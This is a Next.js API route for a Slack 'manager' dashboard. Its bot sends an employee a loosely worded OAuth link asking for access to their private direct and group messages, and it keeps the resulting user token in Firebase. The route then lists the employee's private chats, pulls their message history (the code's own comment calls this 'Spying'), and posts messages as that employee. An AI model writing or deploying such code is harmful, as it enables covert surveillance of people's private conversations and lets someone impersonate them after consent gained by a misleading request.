/* eslint-disable @typescript-eslint/no-explicit-any */
// app/api/slack/manager/route.ts
import { NextResponse } from 'next/server';
import { db } from '@/lib/firebase';
import { doc, getDoc } from 'firebase/firestore';

// ⚠️ Credentials
const BOT_TOKEN = "xoxb-YOUR_BOT_TOKEN_HERE"; // Aapka existing Bot Token
const CLIENT_ID = "YOUR_CLIENT_ID"; // Same as above
const REDIRECT_URI = "http://localhost:3000/api/auth/callback";

export async function POST(req: Request) {
  try {
    const body = await req.json();
    const { action, targetUserId, channelId, text } = body;

    // --- CASE 1: Send Invite Link (Bot user ko link bhejega) ---
    if (action === 'send_invite') {
       const scopes = "chat:write,im:read,im:history,users:read,mpim:read";
       const authLink = `https://slack.com/oauth/v2/authorize?client_id=${CLIENT_ID}&user_scope=${scopes}&redirect_uri=${REDIRECT_URI}`;
       
       const msg = `👋 Hey! Dashboard integration ke liye permissions chahiye.\n👇 *Please is link par click kar ke Allow karein:*\n${authLink}`;

       // Bot opens DM with user
       const openRes = await fetch('https://slack.com/api/conversations.open', {
         method: 'POST',
         headers: { Authorization: `Bearer ${BOT_TOKEN}`, 'Content-Type': 'application/json' },
         body: JSON.stringify({ users: targetUserId })
       });
       const openData = await openRes.json();
       
       if(!openData.ok) return NextResponse.json({ error: "User not found" });

       // Bot sends message
       await fetch('https://slack.com/api/chat.postMessage', {
         method: 'POST',
         headers: { Authorization: `Bearer ${BOT_TOKEN}`, 'Content-Type': 'application/json' },
         body: JSON.stringify({ channel: openData.channel.id, text: msg })
       });

       return NextResponse.json({ success: true });
    }

    // --- Baki Actions ke liye User Token chahiye ---
    if (!targetUserId) return NextResponse.json({ error: "User ID required" });

    // Firebase se us employee ka token uthao
    const tokenDoc = await getDoc(doc(db, "slack_tokens", targetUserId));
    if (!tokenDoc.exists()) return NextResponse.json({ error: "User not connected yet" }, { status: 403 });
    
    const USER_TOKEN = tokenDoc.data().accessToken;

    // --- CASE 2: List User's Chats ---
    if (action === 'list_chats') {
        const res = await fetch('https://slack.com/api/users.conversations?types=im,mpim&limit=30', {
            headers: { Authorization: `Bearer ${USER_TOKEN}` }
        });
        const data = await res.json();
        
        // Chat IDs ko Names main convert karna
        const chats = await Promise.all((data.channels || []).map(async (c: any) => {
            if(c.is_im) {
                const uRes = await fetch(`https://slack.com/api/users.info?user=${c.user}`, {
                    headers: { Authorization: `Bearer ${USER_TOKEN}` }
                });
                const uData = await uRes.json();
                return { ...c, name: uData.user?.real_name || "Unknown", image: uData.user?.profile?.image_48 };
            }
            return { ...c, name: "Group Chat", image: null };
        }));
        
        return NextResponse.json({ chats });
    }

    // --- CASE 3: Get Messages (Spying) ---
    if (action === 'get_messages') {
        const res = await fetch(`https://slack.com/api/conversations.history?channel=${channelId}&limit=50`, {
            headers: { Authorization: `Bearer ${USER_TOKEN}` }
        });
        const data = await res.json();
        return NextResponse.json({ messages: data.messages?.reverse() || [] });
    }

    // --- CASE 4: Send Message AS USER ---
    if (action === 'send_as_user') {
        const res = await fetch('https://slack.com/api/chat.postMessage', {
            method: 'POST',
            headers: { Authorization: `Bearer ${USER_TOKEN}`, 'Content-Type': 'application/json' },
            body: JSON.stringify({ channel: channelId, text: text, as_user: true })
        });
        return NextResponse.json(await res.json());
    }

    return NextResponse.json({ error: "Invalid Action" });

  } catch (e) {
    return NextResponse.json({ error: e }, { status: 500 });
  }
}